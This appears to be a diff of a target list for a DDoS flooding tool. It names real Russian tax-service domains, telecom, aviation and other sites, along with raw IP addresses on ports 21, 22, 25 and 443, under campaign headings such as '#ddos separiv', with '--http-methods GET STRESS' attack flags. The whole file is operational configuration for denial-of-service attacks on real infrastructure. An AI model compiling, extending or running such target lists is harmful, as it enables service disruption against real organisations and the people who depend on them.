@@ -1,13 +1,15 @@
 #zhnec
 
-https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 --http-methods STRESS
-https://spravka-nalog.ru https://viza.spravka-nalog.ru tcp://213.24.64.94:443 tcp://87.242.70.127:443 tcp://90.156.242.130:443 --http-methods STRESS
+https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru --http-methods STRESS
+tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 tcp://213.24.64.94:443 tcp://87.242.70.127:443 tcp://90.156.242.130:443
 
 #gaidamaky
-tcp://89.208.82.209:21 tcp://89.208.82.209:22 tcp://89.208.82.209:25 http://89.208.82.209 https://89.208.82.209 --http-methods GET
-tcp://89.208.82.196:21 tcp://89.208.82.196:22 tcp://89.208.82.196:25 http://89.208.82.206 https://89.208.82.206 --http-methods GET
-http://89.208.82.196 tcp://89.208.82.195:22 tcp://89.208.82.195:25 tcp://89.208.82.206:21 tcp://89.208.82.206:22 --http-methods GET
+tcp://89.208.82.209:21 tcp://89.208.82.209:22 tcp://89.208.82.209:25 tcp://89.208.82.196:22 tcp://89.208.82.196:25
+tcp://89.208.82.196:21 tcp://89.208.82.195:22 tcp://89.208.82.195:25 tcp://89.208.82.206:21 tcp://89.208.82.206:22
 http://www.gravitel.ru https://www.gravitel.ru http://aloha.ru --http-methods GET STRESS
+http://89.208.82.209 https://89.208.82.209 http://89.208.82.206 https://89.208.82.206 http://89.208.82.196 --http-methods GET
+
+
 
 #ddos separiv
 https://new.sipaero.ru https://mail.new.sipaero.ru https://md-crimea.ru --http-methods GET STRESS
